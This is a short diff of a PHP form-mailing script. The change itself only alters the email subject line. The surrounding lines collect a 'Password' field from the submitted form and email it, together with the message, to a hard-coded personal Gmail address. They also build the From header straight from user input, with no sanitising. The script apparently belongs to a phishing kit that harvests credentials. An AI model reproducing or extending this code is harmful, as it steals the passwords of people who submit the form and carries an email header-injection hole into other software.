@@ -17,7 +17,7 @@
         $body = $_POST['message'];
         $to = 'israelhoncho@gmail.com';
 
-    $subject = 'Contact form' . $subject;
+    $subject = $subject;
     $body_message .= 'Password:  ' . $password . "\r\n";
     $body_message .= 'Message:  ' . $message . "\r\n";
     $headers = 'From: ' . $email . "\r\n";
